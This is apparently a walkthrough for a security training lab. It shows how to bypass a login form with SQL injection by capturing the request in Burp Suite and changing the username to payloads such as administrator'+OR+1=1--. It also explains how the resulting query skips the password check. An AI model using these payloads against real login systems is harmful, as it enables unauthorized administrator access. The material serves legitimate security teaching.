# 🎯 Goal of the Lab
Login to the application as the administrator using a SQL injection attack.

## 🛠️ Tools You Need
- A browser with Burp Suite set up as a proxy.
- Manual login parameter manipulation. 

## 🧪 What You’re Exploiting

The login function likely runs this kind of SQL:
```
SELECT * FROM users WHERE username = 'your_input' AND password = 'your_input';
```
- You will inject SQL code into the username field to trick the query into always returning true — logging you in as administrator.

## ✅ Step-by-Step Solution

- Step 1: Open the Lab in Your Browser

You’ll see a normal login form (Username + Password)

![Website](/sql-injection/Screenshots/1.1.sql.png)

- Step 2: Turn on Burp Suite & Intercept
  - Open `Burp Suite`
  - Turn `Intercept ON`

In your browser, enter anything (e.g., `admin:admin` ) into the login form and submit.

![Website](/sql-injection/Screenshots/1.2.sql.png)

- Step 3: Capture the Login Request

In Burp, you'll see something like this:
```
POST /login HTTP/1.1
Host: your-lab-url
...

username=test&password=test
```

![Website](/sql-injection/Screenshots/1.3.sql.png)

- Step 4: Modify the Username to Inject SQL

Change this line:
```
username=test&password=test
To:
username=administrator'+OR+1=1--&password=anything
```
OR 
```
username=administrator' --&password=anything
```

![Website](/sql-injection/Screenshots/1.4.sql.png)

- Let’s break it down:
    - `administrator'`	Closes the original 'administrator' value
    - `OR 1=1`	Always true, so the query succeeds
    - `--`	Comments out the rest of the query (like password check)

So the backend SQL becomes:
```
SELECT * FROM users WHERE username = 'administrator' OR 1=1 --' AND password = '...';
```
## It ignores the password, and logs you in as `administrator`.

- Step 5: Forward the Request
   - Click Forward in Burp

The lab should log you in as administrator

![Website](/sql-injection/Screenshots/1.4.sql.png)

![Website](/sql-injection/Screenshots/1.5.sql.png)



## ✅ Lab Solved!
You’ll see the “Congratulations, you solved the lab!” message.

## 🧠 Summary
- You tricked the SQL query to skip password check

- The injected query returns true, logging you in as administrator

- SQL injection works when user input isn’t properly filtered or escaped
